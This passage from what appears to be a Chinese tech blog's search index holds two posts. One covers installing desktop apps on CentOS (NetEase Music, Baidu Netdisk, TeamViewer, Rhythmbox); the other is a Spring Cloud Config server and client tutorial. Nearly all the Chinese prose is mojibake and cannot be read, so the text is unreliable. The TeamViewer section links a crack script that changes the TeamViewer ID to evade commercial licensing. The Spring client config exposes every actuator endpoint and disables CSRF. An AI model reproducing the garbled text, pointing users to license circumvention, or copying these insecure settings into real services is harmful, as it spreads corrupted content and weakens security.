æ³•å®‰è£…æˆåŠŸï¼Œä¸»è¦æ˜¯ç›¸å…³ä¾èµ–ä¸å®¹æ˜“å®‰è£…å¯¼è‡´ã€‚ä¸‹é¢ä¸»è¦ä»‹ç»å¦‚æœé€šè¿‡ Snap å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹ï¼Œå…¶ä¸­ Snap çš„å®‰è£…å¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ï¼ŒSnap å®‰è£…å®Œæˆåæ‰§è¡Œä»¥ä¸‹æ­¥éª¤å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹å³å¯ï¼Œæ•´ä¸ªå®‰è£…è¿‡ç¨‹éå¸¸ç®€å•ï¼Œä»¥åç®¡ç†åº”ç”¨ä¹Ÿå¾ˆæ–¹ä¾¿ã€‚ 123456789101112131415161718192021222324# å®‰è£…ç½‘æ˜“äº‘éŸ³ä¹ï¼ˆSnapçš„ä¸‹è½½é€Ÿåº¦è¾ƒæ…¢ï¼Œè€å¿ƒç­‰å¾…å®‰è£…å®Œæˆå³å¯ï¼‰# snap install netease-music --devmode --beta# æŸ¥çœ‹å®‰è£…çŠ¶æ€# snap list# åˆ›å»ºå¿«æ·æ–¹å¼# vim /usr/share/applications/netease-music.desktop[Desktop Entry]Type=ApplicationName=Netease-musicGenericName=Netease-musicComment=Music player for netease cloud musicCategories=AudioVideo;Player;RecorderKeywords=musicExec=/snap/bin/netease-musicIcon=/var/lib/snapd/snap/netease-music/current/snap/gui/icon.pngTerminal=falseStartupNotify=true# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; å½±éŸ³ --&gt; Netease-musicï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œæ•ˆæœå›¾å¦‚ä¸‹# æˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ /snap/bin/netease-music ç™¾åº¦ç½‘ç›˜ 2019 å¹´ 6 æœˆä»½ï¼Œç™¾åº¦ç½‘ç›˜å®£å¸ƒæ”¯æŒ Linux å¹³å°ï¼Œå®˜ç½‘æ˜¾ç¤ºé€‚é…ä¸­æ ‡éº’éºŸæ¡Œé¢æ“ä½œç³»ç»Ÿï¼ˆå…†èŠ¯ç‰ˆï¼‰V7.0 ä¸ Ubuntu V18.04ï¼›ç›®å‰æä¾› rpm å’Œ deb åŒ…ä¸‹è½½ï¼Œå®˜æ–¹ä¸‹è½½åœ°å€å¯ä»¥ç‚¹è¿™é‡Œã€‚ 123456789101112# ä¸‹è½½# http://issuecdn.baidupcs.com/issue/netdisk/LinuxGuanjia/2.0.2/baidunetdisk_linux_2.0.2.rpm# å®‰è£…# rpm -ivh baidunetdisk_linux_2.0.2.rpm# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; äº’è”ç½‘ --&gt; baidunetdiskï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œæ•ˆæœå›¾å¦‚ä¸‹# æç¤ºï¼š# é»˜è®¤å®‰è£…ä½ç½®ï¼š/opt/baidunetdisk# ç”¨æˆ·é…ç½®æ–‡ä»¶ä½ç½®ï¼š~/baidunetdisk# é»˜è®¤ä¸‹è½½ä½ç½®ï¼š~/baidunetdiskdownload TeamViewer TeamViewerï¼šåŠŸèƒ½é½å…¨çš„å®Œæ•´ç‰ˆæœ¬ï¼Œæ‹¥æœ‰è¯¥ç³»åˆ—è½¯ä»¶çš„å…¨éƒ¨åŠŸèƒ½ï¼Œæ—¢å¯ä»¥å½“ä½œæœåŠ¡å™¨ç«¯ä¾›å…¶ä»–äººè¿›è¡Œè¿æ¥ï¼Œä¹Ÿå¯ä»¥å½“ä½œæ§åˆ¶ç«¯è¿æ¥å…¶å®ƒä½œä¸ºç»ˆç«¯çš„æœåŠ¡å™¨ç«¯ã€‚ TeamViewer Hostï¼šä¸€ä¸ªå»é™¤äº†æ§åˆ¶ç«¯åŠŸèƒ½çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œå®ƒçš„ç”¨é€”å°±æ˜¯å°†ç”µè„‘è®¾ç½®ä¸ºä¸€ä¸ªå¯ä¾›å…¶ä»–äººéšæ—¶è¿›è¡Œè¿æ¥çš„æœåŠ¡å™¨ç«¯ç³»ç»Ÿï¼Œæ”¯æŒåœ¨ä¸é™æ•°é‡çš„è®¡ç®—æœºå’Œè®¾å¤‡ä¸Šå®‰è£…ã€‚ æç¤ºï¼šä¸Šè¿°ä¸¤ä¸ªç‰ˆæœ¬ä¸æ”¯æŒåŒæ—¶å®‰è£…ï¼Œå…¶ä¸­ä¸¤è€…çš„å®‰è£…éƒ½éœ€è¦ä¾èµ– EPEL æºï¼Œå¦‚æœä»…éœ€è¦æä¾› Centos å®¿ä¸»æœºç»™å…¶ä»–äººè¿œç¨‹è®¿é—®ï¼Œæ¨èåªå®‰è£… TeamViewer Hostï¼Œå®˜æ–¹ä¸‹è½½åœ°å€ï¼Œå®˜æ–¹ä¸­æ–‡å®‰è£…æ•™ç¨‹ã€‚ 12345678910111213141516171819# å¯¼å…¥å…¬é’¥é¿å…ç­¾åéªŒè¯å¤±è´¥ï¼ˆéå¿…éœ€æ­¥éª¤ï¼‰# wget https://dl.teamviewer.cn/download/linux/signature/TeamViewer2017.asc# rpm --import TeamViewer2017.asc# ä¸‹è½½TeamViewerï¼ˆRPMåŒ…åŒºåˆ†32ä½ä¸64ä½ç³»ç»Ÿï¼‰# wget https://dl.teamviewer.cn/download/linux/version_14x/teamviewer_14.6.2452.x86_64.rpm# å®‰è£…TeamViewer# yum install ./teamviewer_14.6.2452.x86_64.rpm# æŸ¥çœ‹TeamVieweræœåŠ¡çš„ç®¡ç†å‘½ä»¤# teamviewer help# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; äº’è”ç½‘ --&gt; TeamViewer 14ï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œåº”ç”¨å¯åŠ¨åçš„æ•ˆæœå›¾å¦‚ä¸‹# å¦‚æœéœ€è¦å¸è½½TeamViewerï¼Œå¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤# yum remove teamviewer# é»˜è®¤å®‰è£…ä½ç½®ï¼š/opt/teamviewer 12345671. TeamViewer Linuxç‰ˆçš„è®¸å¯è¯ç±»å‹é»˜è®¤ä¸ºå…è´¹ï¼Œå½“è¿œç¨‹æ“ä½œè¶…è¿‡ä¸€å®šæ¬¡æ•°æˆ–æ—¶é—´ï¼Œè½¯ä»¶ä¾¿ä¼šæç¤ºå½“å‰è¡Œä¸ºå•†ä¸šç”¨é€”æˆ–è€…è¯•ç”¨ç‰ˆåˆ°æœŸï¼Œæœ€åä¼šè¢«é™åˆ¶è¿æ¥ä½¿ç”¨2. çªç ´TeamViewerçš„å•†ä¸šé™åˆ¶ï¼Œå¯ä»¥å°è¯•æ›´æ”¹TeamViewerçš„IDï¼ˆé€šå¸¸æ ¹æ®MACåœ°å€ç”ŸæˆIDï¼‰ï¼Œå¯å‚è€ƒä»¥ä¸‹æ–¹æ³•æ›´æ”¹TeamViewerçš„IDhttps://github.com/lyz8jj0/mac-teamviewer-crack/blob/master/TeamViewer-id-changer.py%20https://askubuntu.com/questions/423314/how-to-change-teamviewer-id-after-cloning3. æˆ–è€…ä½¿ç”¨frp + mstsc(windows) + vnc(unix/linux)æ–¹æ¡ˆæ›¿ä»£TeamViewer Rhythmbox éŸ³ä¹æ’­æ”¾å™¨ rhythmbox wiKi rhythmbox github rhythmbox third party plugins 1234567891011121314# å®‰è£…æ’­æ”¾å™¨# yum install rhythmbox# å®‰è£…æ’­æ”¾å™¨æ’ä»¶# yum install gstreamer-ffmpeg# yum install gstreamer-plugins-bad# yum install gstreamer-plugins-ugly# æ¢å¤æ’­æ”¾å™¨é»˜è®¤è®¾ç½®$ rm -rf ~/.cache/rhythmbox$ rm -rf ~/.gconf/apps/rhythmbox$ rm -rf ~/.local/share/rhythmbox# åœ¨Gnome-Shellä¸­ï¼ŒRhythmboxåº”ç”¨ç¨‹åºçš„é…ç½®èœå•ä½äºæ´»åŠ¨èœå•é€‰é¡¹æ—è¾¹çš„é¡¶æ ï¼Œåº”ç”¨å¯åŠ¨åçš„æ•ˆæœå›¾å¦‚ä¸‹ å‚è€ƒåšå®¢ æµ·é‡çš„è¶…èµ Linux è½¯ä»¶ å“ªä¸ª Linux å‘è¡Œç‰ˆçš„è½¯ä»¶èµ„æºæœ€å¤šï¼Ÿ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Config å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/9de3ccde.html",text:'é…ç½®ä¸­å¿ƒä»‹ç»ä»€ä¹ˆæ˜¯é…ç½®ä¸­å¿ƒåœ¨é›†ä¸­å¼å¼€å‘æ—¶ä»£ï¼Œé…ç½®æ–‡ä»¶å·²ç»åŸºæœ¬è¶³å¤Ÿäº†ï¼Œå› ä¸ºé‚£æ—¶é…ç½®çš„ç®¡ç†é€šå¸¸ä¸ä¼šæˆä¸ºä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ã€‚ä½†æ˜¯åœ¨äº’è”ç½‘æ—¶ä»£ï¼Œåº”ç”¨éƒ½æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œéƒ¨ç½²åœ¨ N å°æœåŠ¡å™¨ä¸Šï¼Œæƒ³è¦å»çº¿ä¸Šä¸€å°å°åœ°é‡å¯æœºå™¨è‚¯å®šä¸é è°±ï¼Œå¹¶ä¸”ç»´æŠ¤æˆæœ¬ä¹Ÿå¾ˆé«˜ï¼Œæ‰€ä»¥é…ç½®ä¸­å¿ƒåº”è¿è€Œç”Ÿã€‚é…ç½®ä¸­å¿ƒè¢«ç”¨ä½œé›†ä¸­ç®¡ç†ä¸åŒç¯å¢ƒï¼ˆDevã€Testã€Stageã€Prodï¼‰å’Œä¸åŒé›†ç¾¤é…ç½®ï¼Œä»¥åŠåœ¨ä¿®æ”¹é…ç½®åå°†å®æ—¶åŠ¨æ€æ¨é€åˆ°åº”ç”¨ä¸Šè¿›è¡Œåˆ·æ–°ã€‚é…ç½®ä¸­å¿ƒåº”å…·å¤‡çš„åŠŸèƒ½å¦‚ä¸‹ï¼š Open API ä¸šåŠ¡æ— å…³æ€§ é«˜å¯ç”¨é›†ç¾¤ é…ç½®ç”Ÿæ•ˆç›‘æ§ é…åˆç°åº¦ä¸æ›´æ–° ä¸€è‡´æ€§ K-V å­˜å‚¨ ç»Ÿä¸€é…ç½®å®æ—¶æ¨é€ é…ç½®å…¨å±€æ¢å¤ã€å¤‡ä»½ä¸å†å² ä¸»æµé…ç½®ä¸­å¿ƒå¯¹æ¯” Spring Cloud Configã€Apolloã€Nacos å¯¹æ¯”å›¾ Spring Cloud Configã€Netflix Archaiusã€Apolloã€Disconfï¼ˆå·²åœæ­¢ç»´æŠ¤ï¼‰ å¯¹æ¯”å›¾ Config é…ç½®ä¸­å¿ƒæ¦‚è¿°Spring Cloud Config æ˜¯ä¸€ä¸ªé›†ä¸­åŒ–å¤–éƒ¨é…ç½®çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç”±æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ç»„æˆã€‚å®ƒä¸ä¾èµ–äºæ³¨å†Œä¸­å¿ƒï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é…ç½®ä¸­å¿ƒã€‚Spring Cloud Config æ”¯æŒå¤šç§å­˜å‚¨é…ç½®ä¿¡æ¯çš„å½¢å¼ï¼Œç›®å‰ä¸»è¦æœ‰ JDBCã€Vaultã€Nativeã€SVNã€Gitï¼Œå…¶ä¸­é»˜è®¤ä¸º Git å­˜å‚¨å½¢å¼ï¼ŒGit ç‰ˆçš„å·¥ä½œåŸç†å¦‚ä¸‹å›¾ï¼š é…ç½®ä¸­å¿ƒæµè½¬ä¸æ•´ä½“æ”¯æŒå›¾ Config å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 2. å‡†å¤‡å·¥ä½œç”±äºä¸‹é¢çš„ Spring Cloud Config ä½¿ç”¨ Git ä½œä¸ºå­˜å‚¨æ–¹å¼ï¼Œå› æ­¤éœ€è¦æå‰åœ¨ Git è¿œç¨‹ä»“åº“ï¼ˆGithubã€Gitlabï¼‰ä¸­åˆ›å»ºå¯¹åº”çš„ä»“åº“ï¼Œç„¶åå¾€ä»“åº“é‡Œ Push ä¸‰ä¸ªé…ç½®æ–‡ä»¶ï¼Œåˆ†åˆ«æ˜¯ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlï¼Œé…ç½®æ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹ï¼š 123456server: port: 9001cn: springcloud: config: I am the git configuration file from dev environment 123456server: port: 9002cn: springcloud: config: I am the git configuration file from prod environment 123456server: port: 9003cn: springcloud: config: I am the git configuration file from test environment 3. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4. åˆ›å»º Config Server å·¥ç¨‹åˆ›å»º Config Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-config-server 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Server çš„ä¸»å¯åŠ¨ç±»ï¼Œå¢åŠ  @EnableConfigServer æ³¨è§£ï¼š 12345678@EnableConfigServer@SpringBootApplicationpublic class ConfigServerApplication { public static void main(String[] args) { SpringApplication.run(ConfigServerApplication.class, args); }} æ·»åŠ  Config Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå…¶ä¸­ uri æŒ‡çš„æ˜¯ Git è¿œç¨‹ä»“åº“çš„åœ°å€ï¼Œprivate_key_file æ˜¯æŒ‡ SSH å…¬é’¥æ–‡ä»¶ï¼›è‹¥ Git ä»“åº“åœ°å€ä½¿ç”¨çš„æ˜¯ HTTPS åè®®ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ usemame ã€password å‚æ•°æ›¿ä»£æ‰ private_key_fileï¼Œä¸¤è€…åˆ†åˆ«ä»£è¡¨ Git è®¿é—®çš„ç”¨æˆ·åå’Œå¯†ç ï¼›search-paths è¡¨ç¤ºæœç´¢ç‰¹å®šç›®å½•ä¸‹æ‰€æœ‰æ»¡è¶³æ¡ä»¶çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚æ·»åŠ å¤šä¸ªç›®å½•ï¼Œç›®å½•ä¹‹é—´ç”¨é€—å·éš”å¼€ï¼›label æŒ‡çš„æ˜¯ Git ä»“åº“çš„åˆ†æ”¯åç§°ï¼Œå¦‚æœä¸å†™ï¼Œé»˜è®¤çš„åˆ†æ”¯ä¸º master 123456789101112131415server: port: 8001spring: application: name: config-server cloud: config: server: git: uri: git@github.com:xxxxx/spring-cloud-config-study-repo.git search-paths: spring-cloud-config-study-repo/ strictHostKeyChecking: false private_key_file: /root/.ssh/id_rsa.pub label: master å¯åŠ¨ Config Server åº”ç”¨åï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶å°ä¼šè¾“å‡ºå¦‚ä¸‹ä¿¡æ¯ï¼Œè¿™é‡Œåªæ˜¯æˆªå–å…³é”®ä¿¡æ¯ï¼Œä»æ§åˆ¶å°ä¿¡æ¯é‡Œçš„ Mapped ä¸­å¯ä»¥çœ‹åˆ°é…ç½®ä¿¡æ¯å’Œ URL çš„æ˜ å°„å…³ç³»ï¼›å…¶ä¸­ name æ˜¯åº”ç”¨åç§°ï¼Œä¹Ÿå¯ä»¥ç†è§£æˆ Git ä»“åº“é‡Œé…ç½®æ–‡ä»¶çš„åç§°ï¼Œprofile æŒ‡çš„æ˜¯å¯¹åº”æ¿€æ´»çš„ç¯å¢ƒåï¼Œä¾‹å¦‚ devã€testã€prod ç­‰ï¼Œlabel æŒ‡çš„æ˜¯ Git çš„åˆ†æ”¯ 12345678910Mapped "{[/{name}-{profiles}.yml || /{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profiles:.*[^-].*}],methods=[GET]}"Mapped "{[/{name}/{profiles}/{label:.*}],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.properties],methods=[GET]}"Mapped "{[/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.json],methods=[GET]}"Mapped "{[/{label}/{name}-{profiles}.yml || /{label}/{name}-{profiles}.yaml],methods=[GET]}"Mapped "{[/{name}/{profile}/**],methods=[GET],params=[useDefaultLabel]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET]}"Mapped "{[/{name}/{profile}/{label}/**],methods=[GET],produces=[application/octet-stream]}" é€šè¿‡ http://127.0.0.1:8001/config-client/dev/master è®¿é—® Config Serverï¼Œæ¥å£è¿”å›çš„ç»“æœå¦‚ä¸‹ æ­¤æ—¶è§‚å¯Ÿ Config Server æ§åˆ¶å°æ‰“å°çš„ä¿¡æ¯å¯çŸ¥ï¼ŒConfig Server ä¼šåœ¨æœ¬åœ°çš„ä¸´æ—¶ç›®å½•ä¸‹é¢å…‹éš†è¿œç¨‹ä»“åº“ä¸­çš„é…ç½®æ–‡ä»¶ï¼Œæœ¬åœ°ä¸´æ—¶ç›®å½•çš„è·¯å¾„å¦‚ä¸‹ï¼š 1o.s.c.c.s.e.NativeEnvironmentRepository : Adding property source: file:/tmp/config-repo-3558022506897899775/application.yml (document #0) 5. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-config-client 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Config Client çš„ä¸»å¯åŠ¨ç±»ï¼š 1234567@SpringBootApplicationpublic class ConfigClientApplication { public static void main(String[] args) { SpringApplication.run(ConfigClientApplication.class, args); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ï¼š 1234567891011121314@Component@ConfigurationProperties(prefix = "cn.springcloud")public class ConfigProperties { private String config; public String getConfig() { return config; } public void setConfig(String config) { this.config = config; }} 1234567891011@RestControllerpublic class ConfigController { @Autowired public ConfigProperties configProperties; @GetMapping("/getConfigInfo") public String getConfigInfo() { return configProperties.getConfig(); }} æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 123spring: application: name: config-client æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œè¿™äº›é…ç½®ä¸ºä»€ä¹ˆè¦æ”¾åœ¨ bootstrap.yml é‡Œï¼Œè€Œä¸æ”¾åœ¨ application.yml ä¸­å‘¢ï¼Ÿè¿™ä¸ Spring Boot çš„åŠ è½½é¡ºåºæœ‰å…³ï¼Œbootstrap.yml æ–‡ä»¶ä¼šä¼˜å…ˆäº application.yml åŠ è½½ï¼Œå› æ­¤ä¼šå»åŠ è½½è¿œç¨‹çš„é…ç½®æ–‡ä»¶ä¿¡æ¯ 1234567spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ 6. æµ‹è¯•ç»“æœ ä¾æ¬¡å¯åŠ¨ config-serverã€config-client åº”ç”¨ è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment æ›´æ”¹ Git è¿œç¨‹ä»“åº“ä¸­çš„ config-client-dev.yml é…ç½®æ–‡ä»¶ï¼Œå°†å†…å®¹ä¿®æ”¹ä¸º I am the git configuration file from dev environment updated é‡å¯ config-client åº”ç”¨ï¼Œå†æ¬¡è®¿é—® http://127.0.0.1:9001/getConfigInfoï¼Œæ¥å£ä¼šè¿”å› I am the git configuration file from dev environment updatedï¼Œè¯´æ˜é…ç½®æ›´æ–°äº† åˆ·æ–°é…ç½®ä¸­å¿ƒä¿¡æ¯Config Client æ‰‹åŠ¨åˆ·æ–°ä¸ºäº†ä¸ç”¨é‡å¯ Congit Client åº”ç”¨ä¹Ÿå¯ä»¥è·å–åˆ°æœ€æ–°çš„é…ç½®ä¿¡æ¯ï¼Œä¸‹é¢å°†è®²è§£åœ¨ Congit Client ç«¯å¦‚ä½•æ‰‹åŠ¨åˆ·æ–°é…ç½®ä¿¡æ¯ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ i. å‡†å¤‡å·¥ä½œæœ¬ç¤ºä¾‹ç”¨åˆ°ä¸Šé¢å…¥é—¨æ¡ˆä¾‹ä¸­ Git ä»“åº“é‡Œçš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬ config-client-dev.ymlã€config-client-prod.ymlã€config-client-test.ymlã€‚ ii. åˆ›å»º Config Server å·¥ç¨‹ç”±äºæœ¬ç¤ºä¾‹æ˜¯åœ¨ä¸Šé¢çš„å…¥é—¨æ¡ˆä¾‹çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹é€ çš„ï¼Œå› æ­¤ Config Server å·¥ç¨‹ä¸ä¸Šé¢å…¥é—¨æ¡ˆä¾‹ä¸­çš„ Config Server å·¥ç¨‹å®Œå…¨ä¸€æ ·ï¼Œåªéœ€æ‹·è´ä¸€ä»½å³å¯ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ iii. åˆ›å»º Config Client å·¥ç¨‹åˆ›å»º Config Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œç¬¬äºŒä¸ªä¾èµ–æ˜¯ç«¯ç‚¹çš„è®¿é—®ä¾èµ–ï¼Œç¬¬ä¸‰ä¸ªä¾èµ–æ˜¯å®‰å…¨çš„ä¾èµ–ï¼š 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; æ·»åŠ  Config Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œmanagement.endpoints.web.exposure.include=* è¡¨ç¤ºæš´éœ²æ‰€æœ‰ç«¯ç‚¹ï¼Œé»˜è®¤æƒ…å†µä¸‹åªæš´éœ² infoã€health ç«¯ç‚¹ï¼Œmanagement.endpoint.health.show-details=always è¡¨ç¤ºæ€»æ˜¯æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ 1234567891011spring: application: name: config-clientmanagement: endpoints: web: exposure: include: "*" health: show-details: always æ·»åŠ  Config Client éœ€è¦çš„ bootstrap.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼š 1234567spring: cloud: config: name: config-client #éœ€è¦ä»è¿œç¨‹Gitä»“åº“è¯»å–çš„é…ç½®æ–‡ä»¶çš„åç§°ï¼Œæ³¨æ„æ²¡æœ‰"yml"æ–‡ä»¶åç¼€ï¼Œå¯ä»¥å†™å¤šä¸ªï¼Œé€šè¿‡é€—å·éš”å¼€ profile: dev #æœ¬æ¬¡è®¿é—®çš„é…ç½®é¡¹ label: master #Gitåˆ†æ”¯çš„åç§° uri: http://127.0.0.1:8001 #Config Serverçš„åœ°å€ å¾€ Config Client æ·»åŠ å®‰å…¨é…ç½®ç±»ï¼Œä¸»è¦ä½œç”¨æ˜¯å…³é—­ç«¯ç‚¹è®¿é—®çš„å®‰å…¨æ ¡éªŒï¼š 12345678@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { @Override protected void configure(HttpSecurity http) throws Exception { http.csrf().disable(); }} ä¸ºäº†æ›´å¥½åœ°è§‚å¯Ÿæ‹‰å–åˆ°çš„ Git ä¸Šé¢çš„é…ç½®ï¼Œè¿™é‡Œéœ€è¦åˆ›å»ºä¸€ä¸ª Controller ç”¨äºè®¿é—®è¿”å›é…ç½®ä¿¡æ¯ï¼ŒåŒæ—¶è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªå®ä½“ï¼Œç”¨äºæ³¨å…¥è¿œç¨‹é…ç½®ä¸Šçš„ä¿¡æ¯ã€‚æ³¨æ„ï¼Œè¿™é‡Œçš„ ConfigProperties ä¸ ConfigController ç±»éƒ½éœ€è¦é¢å¤–æ·»åŠ  @RefreshScope æ³¨è§£ï¼Œè¢« @RefreshScope æ³¨è§£ä¿®é¥°çš„ Bean éƒ½æ˜¯å»¶è¿ŸåŠ 